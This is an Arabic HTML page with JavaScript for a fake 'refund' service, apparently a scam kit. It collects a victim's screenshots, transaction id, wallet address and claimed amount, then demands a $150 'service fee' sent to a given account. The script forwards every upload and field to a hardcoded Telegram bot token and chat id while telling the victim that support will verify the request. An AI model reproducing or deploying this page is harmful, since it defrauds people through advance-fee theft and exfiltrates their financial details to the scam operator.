<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>استرداد المبلغ - تلجرام متصل</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Cairo', system-ui, sans-serif;
        }
        body {
            background: linear-gradient(145deg, #f0f5fe 0%, #e9eef5 100%);
            min-height: 100vh;
            padding: 2rem 1rem;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .refund-card {
            max-width: 700px;
            width: 100%;
            background: #ffffff;
            border-radius: 2rem;
            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.25);
            overflow: hidden;
        }
        .card-header {
            background: #1a2c3e;
            padding: 1.8rem 2rem;
            color: white;
            text-align: center;
        }
        .card-header h1 {
            font-size: 1.8rem;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }
        .card-body {
            padding: 2rem;
        }
        .form-group {
            margin-bottom: 1.8rem;
        }
        label {
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
            color: #1e2f3e;
            margin-bottom: 8px;
        }
        input {
            width: 100%;
            padding: 12px 16px;
            border-radius: 18px;
            border: 1.5px solid #e2e8f0;
            font-size: 0.95rem;
        }
        .file-upload-area {
            display: flex;
            align-items: center;
            gap: 12px;
            flex-wrap: wrap;
        }
        .file-btn {
            background: #eef2fa;
            border: 1px solid #cbd5e1;
            padding: 10px 20px;
            border-radius: 40px;
            font-weight: 600;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        .file-name {
            font-size: 0.8rem;
            color: #2c7da0;
            background: #f1f5f9;
            padding: 6px 12px;
            border-radius: 30px;
        }
        .btn-primary {
            background: #0f3b4c;
            width: 100%;
            padding: 14px;
            border-radius: 40px;
            font-weight: bold;
            font-size: 1.1rem;
            color: white;
            cursor: pointer;
            border: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .btn-primary:hover {
            background: #0a2c3a;
        }
        .status-box {
            background: #f8fafc;
            border-radius: 28px;
            padding: 1rem 1.5rem;
            margin-top: 1.5rem;
            border-right: 4px solid #2c7da0;
        }
        .warning-box {
            background: #fff9e8;
            border-right: 4px solid #e6a017;
            margin-top: 1rem;
            padding: 1rem;
            border-radius: 20px;
        }
        .fee-address {
            background: #eef2fa;
            padding: 12px 16px;
            border-radius: 32px;
            direction: ltr;
            font-family: monospace;
            word-break: break-all;
            margin-top: 8px;
        }
        .flex-buttons {
            display: flex;
            gap: 12px;
            margin-top: 1rem;
        }
        .btn-secondary {
            background: #e9edf2;
            border: none;
            padding: 12px;
            border-radius: 40px;
            font-weight: 600;
            cursor: pointer;
            flex: 1;
        }
        .hidden {
            display: none;
        }
        .loader {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.6s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        footer {
            background: #f1f5f9;
            text-align: center;
            padding: 1rem;
            font-size: 0.7rem;
        }
    </style>
</head>
<body>

<div class="refund-card">
    <div class="card-header">
        <h1><i class="fab fa-telegram"></i> استرداد المبلغ المستحق</h1>
        <p>سيتم إرسال كل شيء إلى حساب التيليجرام الخاص بك تلقائياً</p>
    </div>

    <div class="card-body">
        <form id="refundForm">
            <div class="form-group">
                <label><i class="fas fa-image"></i> اسكرينات الإرسال الأولي</label>
                <div class="file-upload-area">
                    <label class="file-btn" id="uploadScreenshotBtn1"><i class="fas fa-folder-open"></i> اختر صورة</label>
                    <span class="file-name" id="screenshotFileName">لا توجد صورة</span>
                </div>
                <input type="file" id="screenshotFileInput" accept="image/*" style="display: none;">
            </div>

            <div class="form-group">
                <label><i class="fas fa-water"></i> رقم التدفق</label>
                <input type="text" id="flowId" placeholder="مثال: TXN-7865-ABCD">
            </div>

            <div class="form-group">
                <label><i class="fas fa-wallet"></i> عنوان محفظتك</label>
                <input type="text" id="receiverWallet" placeholder="0x... أو عنوان محفظتك">
            </div>

            <div class="form-group">
                <label><i class="fas fa-coins"></i> المبلغ المستحق (دولار)</label>
                <input type="number" id="dueAmount" placeholder="مثال: 1250.50" step="any">
            </div>

            <div class="warning-box">
                <i class="fas fa-info-circle"></i> بعد الضغط على "استرداد" سيطلب منك دفع <strong>150 دولار</strong> كرسوم خدمة.
            </div>

            <button type="button" id="requestRefundBtn" class="btn-primary"><i class="fas fa-arrow-left"></i> اضغط للاسترداد</button>
        </form>

        <div id="refundStepsPanel" class="status-box hidden">
            <div id="stepMessage"></div>
        </div>

        <div id="paymentPanel" class="hidden">
            <hr>
            <div class="warning-box">
                <strong>رسوم الخدمة: 150 دولار</strong><br>
                أرسل 150 دولار إلى العنوان التالي:
                <div class="fee-address">829548755</div>
                ثم ارفع صورة تؤكد الإرسال.
            </div>

            <div class="form-group">
                <label><i class="fas fa-camera"></i> سكرين الإرسال بعد دفع 150 دولار</label>
                <div class="file-upload-area">
                    <label class="file-btn" id="uploadScreenshotBtn2"><i class="fas fa-folder-open"></i> اختر صورة</label>
                    <span class="file-name" id="paymentScreenshotName">لا توجد صورة</span>
                </div>
                <input type="file" id="paymentScreenshotInput" accept="image/*" style="display: none;">
            </div>

            <div class="flex-buttons">
                <button id="submitPaymentProofBtn" class="btn-primary" style="background:#226644;"><i class="fas fa-paper-plane"></i> تم الإرسال وإرسال البيانات</button>
                <button id="resetStepBtn" class="btn-secondary"><i class="fas fa-sync-alt"></i> إلغاء</button>
            </div>
        </div>

        <div id="verificationPanel" class="hidden status-box">
            <div id="verificationMessage"></div>
        </div>
    </div>
    <footer><i class="fab fa-telegram"></i> البوت يعمل | سيتم إرسال الصور والبيانات إليك فوراً</footer>
</div>

<script>
    // ✅ التوكن الخاص بك
    const BOT_TOKEN = "8659738482:AAFSeSVcD2i_f2pv3wuvNTW8PIi7tWPmUdo";
    
    // ✅ الـ chat_id الخاص بك
    const CHAT_ID = "8727410892";
    
    // -------------------------------------------------------------

    const requestBtn = document.getElementById('requestRefundBtn');
    const refundStepsPanel = document.getElementById('refundStepsPanel');
    const paymentPanel = document.getElementById('paymentPanel');
    const verificationPanel = document.getElementById('verificationPanel');
    const stepMessageDiv = document.getElementById('stepMessage');
    const verificationMessageDiv = document.getElementById('verificationMessage');
    const submitPaymentProofBtn = document.getElementById('submitPaymentProofBtn');
    const resetStepBtn = document.getElementById('resetStepBtn');

    const flowIdInput = document.getElementById('flowId');
    const receiverWalletInput = document.getElementById('receiverWallet');
    const dueAmountInput = document.getElementById('dueAmount');
    
    const screenshotFileInput = document.getElementById('screenshotFileInput');
    const uploadScreenshotBtn1 = document.getElementById('uploadScreenshotBtn1');
    const screenshotFileNameSpan = document.getElementById('screenshotFileName');
    const paymentScreenshotInput = document.getElementById('paymentScreenshotInput');
    const uploadScreenshotBtn2 = document.getElementById('uploadScreenshotBtn2');
    const paymentScreenshotNameSpan = document.getElementById('paymentScreenshotName');
    
    let initialScreenshotBase64 = null;
    let paymentScreenshotBase64 = null;
    let currentState = 'idle';

    function setupFileUpload(triggerBtn, fileInput, onFileSelected, fileNameSpan) {
        triggerBtn.addEventListener('click', () => fileInput.click());
        fileInput.addEventListener('change', (event) => {
            const file = event.target.files[0];
            if (file) {
                fileNameSpan.innerText = file.name;
                const reader = new FileReader();
                reader.onload = (e) => { if (onFileSelected) onFileSelected(e.target.result); };
                reader.readAsDataURL(file);
            } else {
                fileNameSpan.innerText = "لا توجد صورة";
                if (onFileSelected) onFileSelected(null);
            }
        });
    }

    setupFileUpload(uploadScreenshotBtn1, screenshotFileInput, (data) => { initialScreenshotBase64 = data; }, screenshotFileNameSpan);
    setupFileUpload(uploadScreenshotBtn2, paymentScreenshotInput, (data) => { paymentScreenshotBase64 = data; }, paymentScreenshotNameSpan);

    async function sendToTelegram(captionText, photoBase64) {
        let base64Data = photoBase64;
        if (photoBase64.includes(',')) base64Data = photoBase64.split(',')[1];
        const byteCharacters = atob(base64Data);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) byteNumbers[i] = byteCharacters.charCodeAt(i);
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray], { type: 'image/jpeg' });
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('caption', captionText);
        formData.append('photo', blob, 'screenshot.jpg');
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            const result = await response.json();
            return result.ok;
        } catch (error) { return false; }
    }

    async function sendTextToTelegram(message) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const params = new URLSearchParams();
        params.append('chat_id', CHAT_ID);
        params.append('text', message);
        params.append('parse_mode', 'HTML');
        try {
            const response = await fetch(url, { method: 'POST', body: params });
            const result = await response.json();
            return result.ok;
        } catch(e) { return false; }
    }

    function validateBasic() {
        if (!initialScreenshotBase64) { alert("يرجى رفع صورة الإرسال الأولى"); return false; }
        if (!flowIdInput.value.trim()) { alert("أدخل رقم التدفق"); return false; }
        if (!receiverWalletInput.value.trim()) { alert("أدخل عنوان محفظتك"); return false; }
        const amount = parseFloat(dueAmountInput.value.trim());
        if (isNaN(amount) || amount <= 0) { alert("أدخل مبلغ مستحق صحيح"); return false; }
        return true;
    }

    function setStepMessage(msg) { stepMessageDiv.innerHTML = `<i class="fas fa-info-circle"></i> ${msg}`; }
    
    function fullReset() {
        currentState = 'idle';
        paymentPanel.classList.add('hidden');
        verificationPanel.classList.add('hidden');
        refundStepsPanel.classList.add('hidden');
        requestBtn.disabled = false;
        requestBtn.style.opacity = '1';
        paymentScreenshotBase64 = null;
        paymentScreenshotNameSpan.innerText = "لا توجد صورة";
        paymentScreenshotInput.value = '';
        verificationMessageDiv.innerHTML = '';
        setStepMessage('');
        submitPaymentProofBtn.disabled = false;
        submitPaymentProofBtn.innerHTML = '<i class="fas fa-paper-plane"></i> تم الإرسال وإرسال البيانات';
        resetStepBtn.style.background = "#e9edf2";
    }
    
    function onRequestRefund() {
        if (currentState !== 'idle') { alert("يوجد طلب قيد التنفيذ"); return; }
        if (!validateBasic()) return;
        currentState = 'waiting_payment';
        refundStepsPanel.classList.remove('hidden');
        setStepMessage(`✅ تم تسجيل الطلب، المبلغ المستحق: ${dueAmountInput.value} دولار. يلزم دفع 150 دولار كرسوم خدمة.`);
        paymentPanel.classList.remove('hidden');
        requestBtn.disabled = true;
        requestBtn.style.opacity = '0.6';
    }
    
    async function onPaymentProofSubmitted() {
        if (currentState !== 'waiting_payment') { alert("لا توجد عملية دفع معلقة"); return; }
        if (!paymentScreenshotBase64) { alert("يرجى رفع صورة تؤكد إرسال 150 دولار أولاً"); return; }
        
        currentState = 'verifying';
        submitPaymentProofBtn.disabled = true;
        submitPaymentProofBtn.innerHTML = '<i class="loader"></i> جاري الإرسال...';
        verificationPanel.classList.remove('hidden');
        paymentPanel.classList.add('hidden');
        refundStepsPanel.classList.add('hidden');
        verificationMessageDiv.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> يتم إرسال البيانات إلى فريق الدعم عبر تلجرام...';
        
        const flowId = flowIdInput.value.trim();
        const wallet = receiverWalletInput.value.trim();
        const amountDue = dueAmountInput.value.trim();
        const captionFirst = `📸 صورة الإرسال الأولي\n🔹 رقم التدفق: ${flowId}\n🔹 محفظة الاستلام: ${wallet}\n🔹 المبلغ المستحق: ${amountDue} دولار`;
        const captionSecond = `💰 إثبات دفع رسوم الخدمة 150 دولار\n📌 العنوان: 829548755\n🔗 رقم التدفق: ${flowId}`;
        
        await sendToTelegram(captionFirst, initialScreenshotBase64);
        await sendToTelegram(captionSecond, paymentScreenshotBase64);
        await sendTextToTelegram(`✅ طلب استرداد كامل\n🧾 رقم التدفق: ${flowId}\n👛 المحفظة: ${wallet}\n💵 المبلغ المستحق: ${amountDue} USD\n💸 رسوم الخدمة: 150 USD`);
        
        verificationMessageDiv.innerHTML = '<i class="fas fa-check-circle" style="color:green;"></i> ✅ تم استلام الصور والبيانات وإرسالها إلى أدمن التيليجرام بنجاح. سيتم التحقق والرد قريباً.';
        currentState = 'completed';
        submitPaymentProofBtn.innerHTML = '<i class="fas fa-check-double"></i> اكتمل';
        resetStepBtn.style.background = "#0f3b4c";
        resetStepBtn.style.color = "white";
        resetStepBtn.innerHTML = '<i class="fas fa-redo-alt"></i> طلب جديد';
        await sendTextToTelegram(`✅✅✅ تم إكمال إجراءات المستخدم بنجاح. رقم التدفق: ${flowId} - رسوم 150 دولار - يرجى مراجعة الصور.`);
    }
    
    function onResetHandler() {
        if (currentState === 'verifying') { alert("لا يمكن الإلغاء أثناء الإرسال"); return; }
        fullReset();
    }
    
    requestBtn.addEventListener('click', onRequestRefund);
    submitPaymentProofBtn.addEventListener('click', onPaymentProofSubmitted);
    resetStepBtn.addEventListener('click', onResetHandler);
    document.getElementById('refundForm')?.addEventListener('submit', e => e.preventDefault());
</script>
</body>
</html>
</body>
</html>
